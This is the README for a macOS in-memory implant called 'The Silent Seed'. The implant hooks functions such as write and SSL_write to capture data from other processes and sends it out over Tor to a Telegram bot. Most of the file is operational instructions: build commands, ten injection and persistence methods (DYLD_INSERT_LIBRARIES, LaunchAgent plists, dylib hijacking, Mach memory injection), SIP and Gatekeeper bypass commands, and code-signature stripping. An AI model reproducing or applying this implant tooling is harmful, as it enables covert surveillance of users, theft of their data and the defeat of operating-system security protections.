# Component A: The Silent Seed (macOS)

macOS dynamic library-based in-memory implant for passive data capture and exfiltration.

## Building

```bash
# Build as macOS dynamic library (Intel)
cargo build --release --target x86_64-apple-darwin

# Build for Apple Silicon (M1/M2)
cargo build --release --target aarch64-apple-darwin

# Universal binary (Intel + Apple Silicon)
cargo build --release --target x86_64-apple-darwin
cargo build --release --target aarch64-apple-darwin
lipo -create target/x86_64-apple-darwin/release/libprotosyte.dylib \
              target/aarch64-apple-darwin/release/libprotosyte.dylib \
     -output libprotosyte_universal.dylib
```

## Overview

The Silent Seed is a macOS dynamic library (dylib) that hooks system functions to passively capture data from running processes. It operates entirely in memory and exfiltrates encrypted data via Tor to the Broadcast Engine.

## Implantation Methods

### Method 1: DYLD_INSERT_LIBRARIES (Standard)

**Description**: macOS equivalent of LD_PRELOAD. Works with dynamically linked binaries.

**Requirements**:
- Same user or root
- SIP (System Integrity Protection) may block system binaries

**Usage**:
```bash
# Single command
DYLD_INSERT_LIBRARIES=/path/to/libprotosyte.dylib /path/to/target_app

# All processes in shell session
export DYLD_INSERT_LIBRARIES=/path/to/libprotosyte.dylib

# Persistent (for user processes)
echo 'export DYLD_INSERT_LIBRARIES=/path/to/libprotosyte.dylib' >> ~/.zshrc
```

**Implementation**:
```rust
use protosyte_seed_macos::injection::InjectionManager;

InjectionManager::dyld_insert(
    "/Applications/Target.app/Contents/MacOS/Target",
    "/tmp/libprotosyte.dylib"
)?;
```

**Pros**:
- Simple and widely compatible
- No special privileges needed (for user binaries)
- Standard macOS mechanism

**Cons**:
- SIP blocks system binaries
- Visible in process environment
- May not work with statically linked binaries

---

### Method 2: LaunchAgent/LaunchDaemon (Persistence + Injection)

**Description**: Create LaunchAgent plist that injects library when application starts.

**Requirements**:
- User-level: No special privileges
- System-level: Root access

**Usage**:
```bash
# User-level LaunchAgent
./launch_agent_inject --dylib /tmp/libprotosyte.dylib --target /Applications/App.app

# Load the agent
launchctl load ~/Library/LaunchAgents/com.protosyte.agent.plist
```

**Implementation**:
```rust
InjectionManager::launch_agent_injection(
    "/tmp/libprotosyte.dylib",
    "/Applications/App.app/Contents/MacOS/App"
)?;
```

**Generated plist**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.protosyte.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/App.app/Contents/MacOS/App</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>DYLD_INSERT_LIBRARIES</key>
        <string>/tmp/libprotosyte.dylib</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
```

**Pros**:
- Persistent across reboots
- Automatic injection on target launch
- User-level doesn't require admin

**Cons**:
- Detectable in LaunchAgents
- May be blocked by SIP
- Requires plist file on disk

---

### Method 3: Function Interposing (Binary Patching)

**Description**: Modify binary's load commands to interpose functions at load time.

**Requirements**:
- Write access to binary
- Code signing must be disabled or bypassed

**Usage**:
```bash
# Remove code signature first (if signed)
codesign --remove-signature /Applications/App.app

# Patch binary
./function_interpose --binary /Applications/App.app/Contents/MacOS/App \
                     --function write \
                     --hook libprotosyte.dylib
```

**Implementation**:
```rust
extern "C" fn hooked_write(fd: i32, buf: *const u8, count: usize) -> isize {
    capture_data(buf, count);
    unsafe { original_write(fd, buf, count) }
}

InjectionManager::binary_interposing(
    "/Applications/App.app/Contents/MacOS/App",
    "write",
    hooked_write as *const std::ffi::c_void
)?;
```

**How it works**:
1. Parse Mach-O binary headers
2. Find `LC_SYMTAB` load command
3. Locate target function symbol
4. Add `LC_LOAD_DYLIB` command pointing to our dylib
5. Use `LC_DYLD_INFO_ONLY` to interpose functions

**Pros**:
- Permanent modification
- Works before process starts
- No environment variable needed

**Cons**:
- Requires write access to binary
- Breaks code signing
- Detectable by integrity checks

---

### Method 4: SIP (System Integrity Protection) Bypass

**Description**: Various techniques to bypass or disable SIP for system binary injection.

**Requirements**:
- Recovery Mode access (for disabling SIP)
- Or exploit-based bypass (for runtime bypass)

**Method 4a: Disable SIP in Recovery Mode**

```bash
# Boot into Recovery Mode (hold Cmd+R at startup)
# Open Terminal
csrutil disable
# Reboot
```

**Method 4b: User Space Injection (No SIP bypass needed)**

SIP only protects system directories. User-installed applications are not protected.

```rust
InjectionManager::use_user_space_injection()?;
// Place dylib in user directory (~/Library)
// Inject into user applications only
```

**Method 4c: Exploit-based Bypass**

```rust
InjectionManager::exploit_sip_bypass()?;
// Uses specific SIP bypass vulnerabilities
// Implementation depends on macOS version
```

**Pros**:
- Allows system-wide injection
- Can target system binaries
- Persistent if SIP disabled

**Cons**:
- Reduces system security
- May require reboot
- Exploits may be patched

---

### Method 5: Gatekeeper Bypass (Unsigned Code Execution)

**Description**: Bypass Gatekeeper to execute unsigned dylibs.

**Usage**:
```bash
# Remove quarantine attribute
xattr -d com.apple.quarantine libprotosyte.dylib

# Add to exception list
spctl --add libprotosyte.dylib

# Or disable Gatekeeper (requires admin)
sudo spctl --master-disable
```

**Implementation**:
```rust
InjectionManager::bypass_gatekeeper("/tmp/libprotosyte.dylib")?;
```

**Pros**:
- Allows unsigned code execution
- No code signing required
- Can be automated

**Cons**:
- Requires user interaction or admin
- Detectable in system settings
- May be blocked by newer macOS versions

---

### Method 6: Mach Injection (Memory-only)

**Description**: Inject dylib directly into process memory using Mach APIs.

**Requirements**:
- Root access or `task_for_pid` entitlement
- Target process must allow injection

**Usage**:
```bash
# Requires entitlements or root
sudo ./mach_inject --pid 12345 --dylib libprotosyte.dylib
```

**Implementation**:
```rust
let dylib_bytes = std::fs::read("libprotosyte.dylib")?;
InjectionManager::memory_injection(12345, &dylib_bytes)?;
```

**How it works**:
1. Get task port for target process using `task_for_pid`
2. Allocate memory in target task using `vm_allocate`
3. Write dylib bytes to allocated memory using `vm_write`
4. Set memory protection to executable using `vm_protect`
5. Create thread or call `dlopen` equivalent in remote process

**Mach APIs used**:
- `task_for_pid()`: Get task port
- `vm_allocate()`: Allocate memory
- `vm_write()`: Write to memory
- `vm_protect()`: Set memory protection
- `thread_create()`: Create execution thread

**Pros**:
- No file on disk
- Direct memory injection
- Very stealthy

**Cons**:
- Requires root or entitlements
- Complex implementation
- May be detected by security tools

---

### Method 7: Mach Port Injection (IPC-based)

**Description**: Use Mach ports for inter-process communication and injection.

**Requirements**:
- Mach service registration capability
- Bootstrap access

**Usage**:
```bash
# Register Mach service
./mach_port_inject --register --dylib libprotosyte.dylib

# Target process connects to service and gets injected
```

**Implementation**:
```rust
InjectionManager::mach_port_injection(12345, "/tmp/libprotosyte.dylib")?;
```

**How it works**:
1. Register Mach service with bootstrap
2. Target process connects to service
3. Service responds by injecting dylib
4. Uses legitimate Mach IPC mechanisms

**Pros**:
- Uses legitimate macOS APIs
- Can be persistent via LaunchAgent
- Difficult to detect

**Cons**:
- Requires service registration
- More complex setup
- May require entitlements

---

### Method 8: Dylib Hijacking

**Description**: Replace legitimate dylib with malicious one that re-exports original symbols.

**Requirements**:
- Write access to application bundle
- Ability to place dylib in Frameworks directory

**Usage**:
```bash
# Place our dylib in app's Frameworks directory
cp libprotosyte.dylib /Applications/App.app/Contents/Frameworks/libssl.dylib

# Modify install name if needed
install_name_tool -id @rpath/libssl.dylib libprotosyte.dylib
```

**Implementation**:
```rust
InjectionManager::dylib_hijacking(
    "/Applications/App.app",
    "libssl.dylib",
    "/tmp/libprotosyte.dylib"
)?;
```

**Wrapper dylib structure**:
```rust
// Re-export original symbols
#[link(name = "ssl", kind = "dylib")]
extern "C" {
    // Original OpenSSL symbols
}

// Hook specific functions
#[no_mangle]
pub extern "C" fn SSL_write(ssl: *mut c_void, buf: *const u8, num: usize) -> i32 {
    capture_data(buf, num);
    unsafe { original_SSL_write(ssl, buf, num) }
}
```

**Pros**:
- Automatic loading when app starts
- Appears legitimate
- Persistent

**Cons**:
- Requires app bundle modification
- May break app if not done correctly
- Detectable by integrity checks

---

### Method 9: Code Signing Bypass

**Description**: Remove or bypass code signature requirements.

**Usage**:
```bash
# Remove signature
codesign --remove-signature /Applications/App.app

# Re-sign with ad-hoc signature
codesign -s - /Applications/App.app

# Or add entitlement to allow unsigned code
codesign --entitlements entitlements.plist -s - /Applications/App.app
```

**Entitlements** (entitlements.plist):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
</dict>
</plist>
```

**Implementation**:
```rust
InjectionManager::codesigning_bypass("/Applications/App.app")?;
```

**Pros**:
- Allows unsigned code execution
- Can modify signed binaries
- Enables additional injection methods

**Cons**:
- Reduces security
- May break app functionality
- Detectable

---

### Method 10: Rootless Bypass

**Description**: Work around rootless (System Integrity Protection) by using user space only.

**Requirements**:
- User-level access only
- Must operate in user-accessible locations

**Implementation**:
```rust
InjectionManager::rootless_bypass()?;
// All files placed in ~/Library/Application Support/
// Only targets user applications
```

**Pros**:
- Works without disabling SIP
- No root access needed
- Maintains system security

**Cons**:
- Limited to user applications
- Cannot target system binaries
- May be limited in scope

---

## Library Initialization

The dylib automatically initializes when loaded:

```rust
#[no_mangle]
#[used]
static INIT: extern "C" fn() = init_hooks;

#[no_mangle]
extern "C" fn init_hooks() {
    // Runs when dylib is loaded
    HookManager::init().unwrap();
}

// Constructor runs before main()
#[ctor::ctor]
fn init() {
    init_hooks();
}
```

## macOS-Specific Features

- **Function Hooking**: Hooks `write`, `send`, `SSLWrite`, and more
- **POSIX Shared Memory**: Uses `shm_open` for data buffers
- **LaunchAgent Integration**: Automatic startup and injection
- **SIP Bypass Techniques**: Multiple methods to work around System Integrity Protection
- **Code Signing Bypass**: Methods to execute unsigned code
- **Gatekeeper Bypass**: Techniques to bypass Gatekeeper security

## Configuration

Bot token and endpoints via environment variables:
- `PROTOSYTE_BOT_TOKEN`: Telegram bot token
- `PROTOSYTE_PASSPHRASE`: Encryption passphrase

Or via `mission.yaml`:
```yaml
mission:
  id: 0xDEADBEEFCAFEBABE

exfiltration:
  telegram_token: "[from env]"
  interval_seconds: 347
```

## Requirements

- macOS 10.12+ (x86_64 or ARM64)
- Tor running (via Homebrew: `brew install tor` or Tor Browser)
- May require SIP disabled for system binary injection
- Code signing may need to be bypassed

## Security Considerations

- SIP (System Integrity Protection) blocks many injection methods
- Gatekeeper may block unsigned code
- Code signing is enforced for system binaries
- Modern macOS versions have additional protections
- Use only in authorized environments
- Test in isolated virtual machine first

## Troubleshooting

**Library not loading**:
- Check SIP status: `csrutil status`
- Verify architecture match (x86_64 vs ARM64)
- Check code signature: `codesign -dv libprotosyte.dylib`
- Check Gatekeeper: `spctl -a -v libprotosyte.dylib`

**SIP blocking injection**:
- Disable SIP in Recovery Mode (reduces security)
- Use user-space injection only
- Use exploit-based bypass (if available)

**Gatekeeper blocking**:
- Remove quarantine: `xattr -d com.apple.quarantine libprotosyte.dylib`
- Add exception: `spctl --add libprotosyte.dylib`
- Disable Gatekeeper (requires admin): `sudo spctl --master-disable`

**No data captured**:
- Verify target uses hooked functions
- Check pattern filters in configuration
- Verify hooks are installed correctly

**Exfiltration fails**:
- Verify Tor is running: `lsof -i :9050`
- Check firewall settings
- Verify bot token is correct

## SIP Status

Check SIP status:
```bash
csrutil status
```

Expected output:
- `System Integrity Protection status: enabled.` - SIP is active
- `System Integrity Protection status: disabled.` - SIP is disabled

To disable SIP:
1. Boot into Recovery Mode (Cmd+R at startup)
2. Open Terminal
3. Run `csrutil disable`
4. Reboot

**Warning**: Disabling SIP reduces system security significantly.

## See Also

- `protosyte-seed/README.md` - Linux implantation methods
- `protosyte-seed-windows/README.md` - Windows implantation methods
- `../MISSION_YAML_INTEGRATION.md` - Mission configuration guide
